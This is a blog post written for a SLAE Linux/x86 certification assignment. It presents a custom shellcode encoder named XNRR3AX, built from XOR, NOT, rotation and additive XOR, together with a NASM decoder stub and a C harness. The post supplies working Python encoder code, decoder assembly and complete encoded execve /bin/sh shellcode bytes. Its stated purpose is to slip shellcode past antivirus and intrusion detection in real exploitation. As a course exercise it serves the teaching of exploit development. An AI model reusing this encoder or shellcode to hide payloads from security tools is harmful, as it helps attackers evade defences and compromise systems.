---
layout: post
title: SLAE Assignment 4 - Custom Encoder/Decoder (XNRR3AX)
---

The fourth assignment is to create a custom shellcode encoder and decoder. The whole point of encoding shellcode is change its signature so that the shellcode is not detected by Antivirus softwares and Intrution Detection Systems. This is critical in most of real world exploitation scenarios where AV and IDS are present. The encoder will change the original shellcode into some other shellcode which in assembly might seem like meaningless instructions. Upon execution, the decoder stub present in the encoded shellcode will decode the encoded shellcode and once completed will jump to the decoded shellcode.

Here is how we are going to implement the encoder.
1. XOR each byte of the original shellcode with 0xAA.
2. Apply NOT operation on each byte of the shellcode.
3. Rotate to Right the whole shellcode 3 times.
4. Apply Additive XOR operation on the whole shellcode.

<!-- more -->

Steps 1 and 2 are self explanatory. Let us look at how rotaion works, just for the sake of understading.
- Let the original shellcode be: ABCDEFG
- After one right rotation: GABCDEF
- After second right rotation: FGABCDE
- After third right rotation: EFGABCD

Decoding the rotation is dead simple. During decoding we will rotate the whole shellcode to left 3 times. After first three stages of encoding, the partially encoded shellcode is passed to stage 4 of our encoder. Let us look at what we will be doing in stage 4 of our encoder.

### Additive XOR operation [XOR Kung Fu]

Let our original shellcode be : A1, A2, A3, A4, A5. Then we can represent our encoded shellcode as : B1, B2, B3, B4, B5. Where each byte of the encoded shellcode is computed as follows:

B1 = A1

B2 = A1⊕A2 = B1⊕A2

B3 = A1⊕A2⊕A3 = B2⊕A3

B4 = A1⊕A2⊕A3⊕A4 = B3⊕A4

B5 = A1⊕A2⊕A3⊕A4⊕A5 = B4⊕A5

We can use the following operations to get back each byte of the shellcode from Additive XOR encoded shellcode.

A1 = B1

A2 = B2⊕B1 = (A1⊕A2) ⊕ A1 = A2

A3 = B3⊕B2 = (A1⊕A2⊕A3) ⊕ (A1⊕A2) = A3

A4 = B4⊕B3 = (A1⊕A2⊕A3⊕A4) ⊕ (A1⊕A2⊕A3) = A4

A5 = B5⊕B4 = (A1⊕A2⊕A3⊕A4⊕A5) ⊕ (A1⊕A2⊕A3⊕A4) = A5

### XNRR3AX Encoder
Below is the XNRR3AX encoder written in python which encodes the given shellcode and spits out the encoded shellcode.
```python
#!/usr/bin/env python
# Author	: RIZAL MUHAMMED(UB3RSiCK)
# Description	: XNRR3AX Encoder
# Filename 	: xnrr3ax-encoder.py
# XOR, NOT, ROTATE RIGHT 3, ADDITIVE XOR Encoder

from collections import deque
import sys

# Shellcode dumped from the execve /bin/bash
shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

# Insert bad characters in this list
badchars = [r"\x00"]

encoded_shellcode = ""
encoded_shellcode2 = ""

temp_shellcode = []

for x in bytearray(shellcode):

	# XOR with 0xAA	
	xorred = x^0xAA
	# Applying NOT
	negated = ~xorred

	temp_shellcode.append(int('0x'+'%02x'%(negated & 0xff), 16))

# Convert temp_shellcode list to Deque
dq_es = deque(temp_shellcode)
# Rotate Right 3 times 
dq_es.rotate(3)

bas = list(dq_es)

# Additive XOR

encoded_shellcode += "0x"
encoded_shellcode += "%02x," % bas[0]

encoded_shellcode2 += r"\x"
encoded_shellcode2 += "%02x" % bas[0]

for idx in range(len(bas)-1):
	
	if idx == 0:
		prev_xor = bas[idx]
	
	# XOR next byte with previous xor result	
	xorred = prev_xor^bas[idx+1]
	prev_xor = xorred
		
	encoded_shellcode += "0x"
	encoded_shellcode += "%02x," % (xorred)

	encoded_shellcode2 += r"\x"
	encoded_shellcode2 += "%02x" % (xorred)

# check for bad characters in encoded shellcode 
for badchar in badchars:
	if badchar.lower() in encoded_shellcode2:
		print r"Bad character {} in Shellcode".format(badchar)
		sys.exit()
	
print 'Encoded Opt_1 : ', encoded_shellcode2
print 'Encoded Opt_2 : ', encoded_shellcode.rstrip(',')
```
Lets run the encoder and produce the encoded shellcode.
![XNRR3AX Encoder](/assets/asn-4-encoder-out.PNG)

### XNRR3AX Decoder
Now that we have our encoder, we need to write a decoder stub which will decode the encoded shellcode and pass control to it. Let us look at the stages of decoding.
1. Reverse the Additive XOR operation.
2. Rotate to Left the whole shellcode 3 times.
3. XOR each byte of the original shellcode with 0xAA.
4. Apply NOT operation on each byte of the shellcode.
5. Jump to decoded shellcode.

Without further ado, let us look the decode implementation.
```nasm
;
; Author 	: RIZAL MUHAMMED (UB3RSiCK)
; Desc		: XNRR3AX Decoder
; Note		: XORRED WITH 0XAA	
; Filename	: xnrr3ax-decoder.nasm

; 1) Reverse Additive XOR
; 2) Rotate Left 3 times
; 3) Apply XOR, NOT operation on each byte
; 4) Jump to decoded shellcode 


global _start

section .text
	_start:
		
		jmp short get_shellcode_addr
	
		shellcode_addr:
			
			pop esi				; pointer to shellcode 

			; shift left 3 places the whole shellcode 
			
			xor eax, eax
			xor ebx, ebx
			xor ecx, ecx			; clear registers needed
			xor edx, edx
			
			push esi			; esi has pointer to shellcode 
			pop edi				; clears edi and saves pointer to shellcode in edi

;################################################################################################
	
			; Reverse Additive XOR
			
			mov cl, l_sc - 1		; clears cl and init with loop counter

			mov bl, byte [esi] 		; move first byte of shellcode to ebx

			decoder:
				mov al, byte [esi + 1]	; save a copy of byte [esi + 1] in al, used in next xor operation
				xor byte [esi + 1], bl	; xor byte [esi + 1] with encoded byte in bl
				mov bl, al		; [esi +1] is decoded now, for next stage we require encoded value which is saved in al
				inc esi
				loop decoder

			mov esi, edi			;restore pointer to shellcode in esi
;################################################################################################

			; Rotate left 3 times
			
			mov cl, 0x3			; rotate left 3 times
			shift:	
				push esi			; save pointer to shellcode on stack for later use
				mov bl, byte [esi]		; save byte [esi] in bl

				mov dl, l_sc-1		; shift_loop runs len(shellcode) - 1 times
				shift_loop:

					lea edi, [esi]		; save address of [esi] in edi
					mov al, byte [esi +1]	; move byte [esi + 1] to al
					mov byte [edi], al	; move byte in al to [esi]
					inc esi			; increment esi
					dec dl			; decrement shift_loop counter
					jnz shift_loop
				mov byte [esi], bl		; the first element is saved in the last
				pop esi				; move shellcode address to esi
				loop shift 	

;################################################################################################
			
			; Apply XOR and NOT on each byte

			mov cl, l_sc			; move length of shellcode to ecx
			
			decode_loop:
				not byte [esi]			; Apply NOT operation 
				xor byte [esi], 0xAA		; XOR with 0xAA
				inc esi
				
				loop decode_loop

				jmp short shellcode		; Decoding is complete, jump to the shellcode


		get_shellcode_addr:
			call shellcode_addr
			shellcode: db 0x5e,0xc6,0x13,0x77,0xe2,0xe7,0xda,0xa0,0xda,0xfc,0xc1,0xfc,0x86,0xb1,0x8d,0xb6,0x6a,0xdc,0xd9,0x05,0xb2,0xb4,0x68,0xdc,0x39
			l_sc equ $-shellcode
```

Assembling, Linking and Dumping shellcode.
![Assemble Link Dump Shellcode](/assets/asn-4-asm-link-dump.PNG)

Insert the shellcode in the c template file.
```c
#include<stdio.h>
#include<string.h>
unsigned char code[] = \
"\xeb\x40\x5e\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x56\x5f\xb1\x18\x8a\x1e\x8a\x46\x01\x30\x5e\x01\x88\xc3\x46\xe2\xf5\x89\xfe\xb1\x03\x56\x8a\x1e\xb2\x18\x8d\x3e\x8a\x46\x01\x88\x07\x46\xfe\xca\x75\xf4\x88\x1e\x5e\xe2\xea\xb1\x19\xf6\x16\x80\x36\xaa\x46\xe2\xf8\xeb\x05\xe8\xbb\xff\xff\xff\x5e\xc6\x13\x77\xe2\xe7\xda\xa0\xda\xfc\xc1\xfc\x86\xb1\x8d\xb6\x6a\xdc\xd9\x05\xb2\xb4\x68\xdc\x39";

main()
{
	printf("Shellcode Length:  %d\n", strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}
```
Compile the shellcode.c file and Let us analyze the execution with the help of GDB and observe the decoding process.
![GDB Disassembly Breakpoints1](/assets/asn-4-disas-1.PNG)
![GDB Disassembly Breakpoints2](/assets/asn-4-disas-2.PNG)

Having set break points after each stage of decoding, we can now see the changes happening to the shellcode.
![Intermediate Decode Stages](/assets/asn-4-disas-3.PNG)

After the decoding process, we can see the original Execve /bin/sh shellcode.
![Final decoded Shellcode](/assets/asn-4-disas-4.PNG)

Finally, Let us execute the our decoder executable to see if actually works or not.
![Running Decoder](/assets/asn-4-shellcode-exec.PNG)

And we done :)

This blog post has been created for completing the requirements of the [SLAE (Linux/x86)](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/) certification.

Student ID: **SLAE - 933**


